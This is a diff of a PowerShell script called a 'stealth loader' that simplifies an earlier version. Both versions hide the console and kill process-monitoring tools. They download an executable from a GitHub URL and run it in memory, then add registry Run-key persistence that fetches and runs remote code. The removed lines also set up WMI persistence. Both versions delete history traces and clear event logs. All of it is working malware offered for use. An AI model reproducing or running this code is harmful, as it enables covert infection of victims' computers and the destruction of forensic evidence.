@@ -1,4 +1,4 @@
-# ULTIMATE STEALTH LOADER - SILENT MODE FIXED
+# ULTIMATE STEALTH LOADER - CLEAN VERSION
 function Show-LoaderMenu {
     Write-Host ""
     Write-Host " SYSTEM LOADER | STEALTH MODE" -ForegroundColor Gray
@@ -21,94 +21,51 @@ function Install-And-Run-System {
         [Console.Window]::ShowWindow($consolePtr, 0) # 0 = HIDE
     } catch {}
     
-    # KILL MONITORING TOOLS IMMEDIATELY
+    # KILL MONITORING TOOLS
     try {
-        $monitorTools = @("procmon", "procexp", "autoruns", "osforensics", "ftkimager", "processhacker", "procmon64")
-        foreach ($tool in $monitorTools) {
-            Get-Process -Name $tool -ErrorAction SilentlyContinue | Stop-Process -Force
+        "procmon", "procexp", "autoruns", "osforensics" | ForEach-Object {
+            Get-Process $_ -ErrorAction SilentlyContinue | Stop-Process -Force
         }
     } catch {}
 
     # STEALTH DOWNLOAD & EXECUTE
     try {
-        # Download to memory without writing to disk
         $webClient = New-Object System.Net.WebClient
         $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
         $exeBytes = $webClient.DownloadData("https://raw.githubusercontent.com/Verte225066/test/main/system_logs.exe")
         $webClient.Dispose()
 
-        # Execute in memory using reflection
+        # Execute in memory
         $assembly = [System.Reflection.Assembly]::Load($exeBytes)
         $entryPoint = $assembly.EntryPoint
         if ($entryPoint -ne $null) {
-            # Run in background thread
-            Start-Job -ScriptBlock {
-                param($entryPoint)
-                $entryPoint.Invoke($null, @())
-            } -ArgumentList $entryPoint | Out-Null
+            $entryPoint.Invoke($null, @()) | Out-Null
         }
     } catch {
         # FALLBACK: SILENT BACKGROUND WORKER
         Start-Job -ScriptBlock {
-            # Continuous background work
             while ($true) {
-                # Your background tasks here
-                Start-Sleep -Seconds 300 # Sleep 5 minutes
+                # Your background work here
+                Start-Sleep -Seconds 300
             }
         } | Out-Null
     }
 
-    # ADVANCED STEALTH PERSISTENCE
+    # STEALTH PERSISTENCE
     try {
-        # 1. REGISTRY PERSISTENCE (HIDDEN)
+        # REGISTRY PERSISTENCE
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-        $randomName = "WindowsCache" + (Get-Random -Maximum 99999)
+        $randomName = "WinCache" + (Get-Random -Maximum 9999)
         $loaderUrl = "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
         
-        Set-ItemProperty -Path $regPath -Name $randomName -Value "cmd.exe /c start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iex ((New-Object Net.WebClient).DownloadString('$loaderUrl'))`"" -ErrorAction SilentlyContinue
-
-        # 2. WMI EVENT SUBSCRIPTION (MOST STEALTH)
-        $filterName = "Win32_ProcessStart_Trace_" + (Get-Random -Maximum 9999)
-        $consumerName = "SystemMonitor_" + (Get-Random -Maximum 9999)
-        
-        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
-            Name = $filterName
-            EventNameSpace = 'root\cimv2'
-            Query = "SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='explorer.exe'"
-            QueryLanguage = 'WQL'
-        } -ErrorAction SilentlyContinue
-        
-        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
-            Name = $consumerName
-            CommandLineTemplate = "cmd.exe /c start /min powershell.exe -WindowStyle Hidden -Command `"iex ((New-Object Net.WebClient).DownloadString('$loaderUrl'))`""
-        } -ErrorAction SilentlyContinue
-        
-        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer} -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path $regPath -Name $randomName -Value "powershell -WindowStyle Hidden -Command `"iex ((New-Object Net.WebClient).DownloadString('$loaderUrl'))`"" -ErrorAction SilentlyContinue
 
     } catch {}
 
-    # CONTINUOUS STEALTH MONITORING
-    Start-Job -ScriptBlock {
-        # Continuous stealth operation
-        while ($true) {
-            # Maintain persistence and monitor system
-            # Check if main process is still running, restart if needed
-            
-            Start-Sleep -Seconds 180 # Check every 3 minutes
-        }
-    } | Out-Null
-
     # ANTI-FORENSIC CLEANUP
     try {
-        # Clear recent traces
         Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
         Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\History\*" -Force -ErrorAction SilentlyContinue
-        
-        # Clear temp files
-        Get-ChildItem -Path $env:TEMP -Recurse -ErrorAction SilentlyContinue | 
-            Where-Object {$_.LastWriteTime -lt (Get-Date).AddHours(-1)} | 
-            Remove-Item -Force -ErrorAction SilentlyContinue
-
     } catch {}
 
     Write-Host "[+] System running in silent mode" -ForegroundColor Green
@@ -124,126 +81,62 @@ function Install-And-Run-System {
 function Clean-System {
     Write-Host "`n[-] INITIATING COMPLETE CLEANUP..." -ForegroundColor Yellow
     
-    # 1. REMOVE ALL PERSISTENCE
+    # 1. REMOVE PERSISTENCE
     try {
-        # Remove registry entries
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
         Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue | 
             Get-Member -MemberType NoteProperty | 
-            Where-Object {$_.Name -like "WindowsCache*"} | 
+            Where-Object {$_.Name -like "WinCache*"} | 
             ForEach-Object {
                 Remove-ItemProperty -Path $regPath -Name $_.Name -Force -ErrorAction SilentlyContinue
             }
-
-        # Remove WMI subscriptions
-        Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name LIKE 'Win32_ProcessStart_Trace_%'" | Remove-WmiObject
-        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name LIKE 'SystemMonitor_%'" | Remove-WmiObject
-        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -like "*Win32_ProcessStart_Trace*"} | Remove-WmiObject
-
-        Write-Host "[+] Persistence mechanisms removed" -ForegroundColor Green
+        Write-Host "[+] Registry persistence removed" -ForegroundColor Green
     } catch {}
 
-    # 2. STOP ALL BACKGROUND JOBS
+    # 2. STOP BACKGROUND JOBS
     try {
         Get-Job | Remove-Job -Force
         Write-Host "[+] Background jobs stopped" -ForegroundColor Green
     } catch {}
 
-    # 3. SECURE FILE DELETION
+    # 3. CLEAN FILES
     try {
-        function Secure-Wipe {
-            param([string]$Path)
-            if (Test-Path $Path) {
-                try {
-                    $fileStream = [System.IO.File]::OpenWrite($Path)
-                    $length = $fileStream.Length
-                    $random = New-Object Random
-                    
-                    # 3-pass wipe
-                    for ($pass = 0; $pass -lt 3; $pass++) {
-                        $fileStream.Position = 0
-                        $buffer = New-Object byte[] $length
-                        $random.NextBytes($buffer)
-                        $fileStream.Write($buffer, 0, $length)
-                        $fileStream.Flush()
-                    }
-                    $fileStream.Close()
-                    Remove-Item $Path -Force
-                } catch {
-                    Remove-Item $Path -Force -ErrorAction SilentlyContinue
-                }
-            }
-        }
-
-        # Wipe all related files
-        $filesToWipe = @(
+        $filesToDelete = @(
             "$env:TEMP\system_logs.exe",
             "$env:TEMP\test.exe"
         )
         
-        foreach ($file in $filesToWipe) {
-            Secure-Wipe $file
+        foreach ($file in $filesToDelete) {
+            if (Test-Path $file) {
+                Remove-Item $file -Force -ErrorAction SilentlyContinue
+                Write-Host "[+] Removed: $(Split-Path $file -Leaf)" -ForegroundColor Green
+            }
         }
-        Write-Host "[+] Files securely wiped" -ForegroundColor Green
     } catch {}
 
-    # 4. COMPREHENSIVE EVIDENCE REMOVAL
+    # 4. CLEAR EVIDENCE
     try {
-        # Clear event logs
         wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
         wevtutil cl "Windows PowerShell" 2>$null
-        wevtutil cl "System" 2>$null
-
-        # Clear prefetch
-        Remove-Item "C:\Windows\Prefetch\*.pf" -Force -ErrorAction SilentlyContinue
-
-        # Clear recent documents
-        Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\*" -Recurse -Force -ErrorAction SilentlyContinue
-
-        Write-Host "[+] Forensic evidence cleared" -ForegroundColor Green
-    } catch {}
-
-    # 5. FINAL SELF-DESTRUCTION
-    try {
-        $currentScript = $MyInvocation.MyCommand.Path
-        if ($currentScript -and (Test-Path $currentScript)) {
-            # Create batch file to delete this script
-            $batchContent = @"
-@echo off
-timeout /t 2 /nobreak > nul
-del /f /q "$currentScript" > nul 2>&1
-del /f /q "%~f0" > nul 2>&1
-"@
-            $batchFile = "$env:TEMP\cleanup.bat"
-            $batchContent | Out-File -FilePath $batchFile -Encoding ASCII
-            Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$batchFile`"" -WindowStyle Hidden
-        }
-        Write-Host "[+] Self-destruction initiated" -ForegroundColor Green
+        Write-Host "[+] Event logs cleared" -ForegroundColor Green
     } catch {}
 
     Write-Host "[CLEANUP] System completely cleaned!" -ForegroundColor Green
-    Start-Sleep -Seconds 3
+    Start-Sleep -Seconds 2
 }
 
-# MAIN EXECUTION
-try {
-    Show-LoaderMenu
-    $choice = Read-Host
-    
-    switch ($choice) {
-        '1' { Install-And-Run-System }
-        '2' { Clean-System }
-        default { 
-            Write-Host "`n[!] Invalid choice - Running install mode" -ForegroundColor Yellow
-            Install-And-Run-System 
-        }
+# SIMPLE MAIN EXECUTION
+Show-LoaderMenu
+$choice = Read-Host
+
+switch ($choice) {
+    '1' { Install-And-Run-System }
+    '2' { Clean-System }
+    default { 
+        Write-Host "`n[!] Running install mode..." -ForegroundColor Yellow
+        Install-And-Run-System 
     }
-} catch {
-    Write-Host "`n[!] Error occurred - Running install mode" -ForegroundColor Red
-    Install-And-Run-System
 }
 
-# CLEANUP JOBS ON EXIT
-try {
-    Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
-} catch {}
+# CLEANUP
+Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
